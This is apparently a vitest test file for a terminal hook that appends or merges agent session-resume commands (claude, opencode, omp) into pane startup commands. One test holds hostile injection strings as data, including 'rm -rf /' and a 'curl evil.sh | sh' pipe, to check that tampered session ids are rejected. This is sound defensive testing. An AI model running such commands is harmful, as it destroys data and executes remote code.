import { describe, it, expect, beforeEach } from 'vitest';
import {
  withClaudeResume,
  resetResumedSurfaces,
  hasResumed,
} from '../../src/renderer/hooks/claude-resume-command';

const ID = '11111111-2222-3333-4444-555555555555';

const call = (over: Partial<Parameters<typeof withClaudeResume>[0]> = {}) =>
  withClaudeResume({ base: undefined, surfaceId: 'surf-1', claudeSessionId: ID, enabled: true, ...over });

describe('withClaudeResume', () => {
  beforeEach(resetResumedSurfaces);

  it('appends the resume for an opted-in surface that has a stored session', () => {
    expect(call()).toEqual([`claude --resume ${ID}`]);
  });

  // The pref default is false and README promised the opposite behaviour for
  // years — an accidental resume spends tokens the user never asked to spend.
  it('does nothing at all when the preference is off', () => {
    const base = ['nvm use'];
    expect(call({ base, enabled: false })).toBe(base);
    expect(hasResumed('surf-1')).toBe(false);
  });

  it('keeps quick-launch commands and puts the resume LAST', () => {
    // `claude --resume` takes over the terminal, so anything queued after it
    // would be typed into Claude's input box instead of run by the shell.
    expect(call({ base: ['nvm use', 'cd packages/app'] }))
      .toEqual(['nvm use', 'cd packages/app', `claude --resume ${ID}`]);
  });

  it('does not mutate the caller\'s array', () => {
    const base = ['nvm use'];
    call({ base });
    expect(base).toEqual(['nvm use']);
  });

  it('resumes a surface at most once per run', () => {
    expect(call()).toEqual([`claude --resume ${ID}`]);
    // Second create for the same surface — a remount after the shell exited.
    expect(call({ base: ['nvm use'] })).toEqual(['nvm use']);
  });

  it('tracks the guard per surface, not globally', () => {
    call({ surfaceId: 'surf-1' });
    expect(call({ surfaceId: 'surf-2' })).toEqual([`claude --resume ${ID}`]);
  });

  it('refuses an id that was hand-edited into session.json', () => {
    const base = ['nvm use'];
    for (const hostile of ['x; rm -rf /', 'abcdefgh && curl evil.sh | sh', 'short', 'a b c d e f g h']) {
      expect(call({ base, claudeSessionId: hostile }), hostile).toBe(base);
    }
    expect(hasResumed('surf-1')).toBe(false);
  });

  it('is inert without a surface id or a stored session', () => {
    const base = ['nvm use'];
    expect(call({ base, surfaceId: undefined })).toBe(base);
    expect(call({ base, claudeSessionId: undefined })).toBe(base);
  });

  // A rejected call must not burn the surface's one resume — otherwise turning
  // the pref on after a restore would silently do nothing for that pane.
  it('does not consume the guard on a rejected call', () => {
    call({ enabled: false });
    call({ claudeSessionId: 'nope' });
    expect(call()).toEqual([`claude --resume ${ID}`]);
  });

  // ─── #302: a pane whose startup command IS the agent launcher ─────────────
  //
  // Appending here typed the resume into the agent's own TUI — the launcher
  // takes the terminal before the next line runs. The resume now rides on the
  // launcher's command line, so the pane's name and flags survive too.

  it('merges the resume into the pane\'s own launcher instead of adding a line', () => {
    const base = ['opencode2 --server https://code.homenode.stream'];
    expect(call({ base, claudeSessionId: undefined, opencodeSessionId: 'ses_abc12345', opencodeEnabled: true }))
      .toEqual(['opencode2 --server https://code.homenode.stream -s ses_abc12345']);
  });

  it('merges a claude resume into a claude launcher, flags kept', () => {
    expect(call({ base: ['nvm use', 'claude --model sonnet'] }))
      .toEqual(['nvm use', `claude --model sonnet --resume ${ID}`]);
  });

  it('adds nothing when the pane launches a different agent', () => {
    const base = ['claude'];
    expect(call({ base, claudeSessionId: undefined, opencodeSessionId: 'ses_abc12345', opencodeEnabled: true })).toBe(base);
    // Nothing was typed, so the handle is still available for a later create.
    expect(hasResumed('surf-1')).toBe(false);
  });

  it('handles omp session resume with path quoting', () => {
    const path = 'C:/Users/test/my project/session.jsonl';
    expect(call({ claudeSessionId: undefined, ompSessionId: path, ompEnabled: true, shell: 'cmd.exe' }))
      .toEqual([`omp --resume "${path}"`]);
  });

  it('refuses to resume omp when disabled or invalid', () => {
    const path = 'C:/Users/test/session.jsonl';
    expect(call({ claudeSessionId: undefined, ompSessionId: path, ompEnabled: false })).toBeUndefined();
    expect(call({ claudeSessionId: undefined, ompSessionId: 'invalid-token', ompEnabled: true })).toBeUndefined();
  });
});
